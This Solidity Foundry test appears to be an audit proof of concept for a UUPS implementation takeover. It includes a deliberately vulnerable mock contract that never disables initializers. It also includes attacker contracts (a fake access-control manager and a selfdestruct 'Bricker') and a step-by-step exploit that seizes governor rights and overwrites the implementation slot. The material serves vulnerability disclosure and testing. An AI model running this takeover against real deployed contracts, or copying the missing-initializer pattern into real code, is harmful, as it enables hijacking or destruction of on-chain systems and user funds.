// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/*
 * Vulnerability: UUPS implementation contracts (e.g. PullTokenWrapperTransfer,
 * DistributionCreator, NativeTokenWrapper, ...) do NOT call _disableInitializers()
 * in their constructor. As a result, anyone can call `initialize()` directly on the
 * deployed implementation contract, take over its storage (set their own
 * AccessControlManager), and then call upgradeToAndCall() to point the
 * implementation to a malicious logic contract that selfdestructs / bricks it.
 *
 * Invariant violated: implementation contracts must NOT be initializable by
 * arbitrary callers; otherwise governance / upgrade authorization on the
 * implementation context is fully attacker-controlled.
 */

// --- Minimal UUPS-like implementation mirroring the vulnerable pattern ---

interface IAccessControlManager {
    function isGovernor(address) external view returns (bool);
}

interface IDistributionCreator {
    function accessControlManager() external view returns (IAccessControlManager);
}

// Mimics OZ's Initializable (simplified): single-shot initializer w/o
// _disableInitializers() being invoked in constructor.
abstract contract Initializable {
    uint8 internal _initialized;
    bool internal _initializing;

    modifier initializer() {
        require(_initialized < 1, "already initialized");
        _initialized = 1;
        _initializing = true;
        _;
        _initializing = false;
    }

    // NOTE: vulnerable contracts FAIL to call this in their constructor.
    function _disableInitializers() internal {
        _initialized = type(uint8).max;
    }
}

// Minimal ERC1967 + UUPS-ish proxy slot writer (only what we need to prove the bug)
abstract contract UUPSUpgradeable is Initializable {
    // EIP-1967 implementation slot
    bytes32 internal constant _IMPL_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    function _authorizeUpgrade(address newImplementation) internal virtual;

    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable {
        _authorizeUpgrade(newImplementation);
        assembly {
            sstore(_IMPL_SLOT, newImplementation)
        }
        if (data.length > 0) {
            (bool ok, ) = newImplementation.delegatecall(data);
            require(ok, "delegatecall failed");
        }
    }

    function implementation() external view returns (address impl) {
        assembly {
            impl := sload(_IMPL_SLOT)
        }
    }
}

// Mirrors the vulnerable PullTokenWrapperTransfer pattern.
contract PullTokenWrapperTransfer is UUPSUpgradeable {
    address public token;
    IDistributionCreator public distributionCreator;
    address public minter;
    string public name;
    string public symbol;

    // !!! VULNERABILITY: NO constructor calling _disableInitializers() !!!
    // constructor() { _disableInitializers(); }  // <-- missing

    function initialize(
        address _token,
        IDistributionCreator _distributionCreator,
        address _minter,
        string memory _name,
        string memory _symbol
    ) external initializer {
        token = _token;
        distributionCreator = _distributionCreator;
        minter = _minter;
        name = _name;
        symbol = _symbol;
    }

    function accessControlManager() public view returns (IAccessControlManager) {
        return distributionCreator.accessControlManager();
    }

    modifier onlyGovernorUpgrader() {
        require(accessControlManager().isGovernor(msg.sender), "not governor");
        _;
    }

    function _authorizeUpgrade(address) internal view override onlyGovernorUpgrader {}
}

// Attacker-controlled ACM
contract EvilACM is IAccessControlManager {
    address public boss;
    constructor(address _boss) { boss = _boss; }
    function isGovernor(address a) external view override returns (bool) {
        return a == boss;
    }
}

// Attacker-controlled DistributionCreator returning EvilACM
contract EvilDistributionCreator is IDistributionCreator {
    IAccessControlManager public acm;
    constructor(IAccessControlManager _acm) { acm = _acm; }
    function accessControlManager() external view override returns (IAccessControlManager) {
        return acm;
    }
}

// Malicious logic that selfdestructs in the implementation context
contract Bricker {
    function brick() external {
        selfdestruct(payable(msg.sender));
    }
}

contract ExploitTest is Test {
    PullTokenWrapperTransfer impl;
    address attacker = address(0xBADBAD);
    address legitDeployer = address(0xDEADBEEF);

    function setUp() public {
        // Deployer publishes the implementation (logic contract). Note: it does
        // NOT initialize it — the proxy is supposed to initialize through delegatecall.
        vm.prank(legitDeployer);
        impl = new PullTokenWrapperTransfer();
    }

    function test_exploit_takeoverAndBrickImplementation() public {
        // ---------------------------------------------------------
        // Step 1: Attacker deploys their own ACM + DistributionCreator
        // ---------------------------------------------------------
        vm.startPrank(attacker);
        EvilACM evilAcm = new EvilACM(attacker);
        EvilDistributionCreator evilDC = new EvilDistributionCreator(evilAcm);

        // ---------------------------------------------------------
        // Step 2: Attacker calls initialize() DIRECTLY on the implementation.
        // This succeeds because _disableInitializers() was never called.
        // ---------------------------------------------------------
        impl.initialize(
            address(0x1234),                   // token (irrelevant)
            IDistributionCreator(address(evilDC)),
            attacker,
            "pwn",
            "PWN"
        );

        // Sanity: attacker is governor according to the implementation now.
        assertEq(address(impl.distributionCreator()), address(evilDC));
        assertTrue(impl.accessControlManager().isGovernor(attacker));

        // ---------------------------------------------------------
        // Step 3: Attacker deploys malicious logic and upgrades the
        // implementation's own EIP-1967 slot to point to it, then calls brick().
        // upgradeToAndCall passes _authorizeUpgrade because attacker is "governor".
        // ---------------------------------------------------------
        Bricker bricker = new Bricker();

        impl.upgradeToAndCall(
            address(bricker),
            abi.encodeWithSelector(Bricker.brick.selector)
        );
        vm.stopPrank();

        // ---------------------------------------------------------
        // Step 4: Prove takeover — implementation slot now points to attacker's logic.
        // ---------------------------------------------------------
        assertEq(impl.implementation(), address(bricker),
            "attacker successfully overwrote the implementation slot");

        // The attacker has effectively bricked / hijacked the implementation
        // contract that all proxies delegatecall into.
    }
}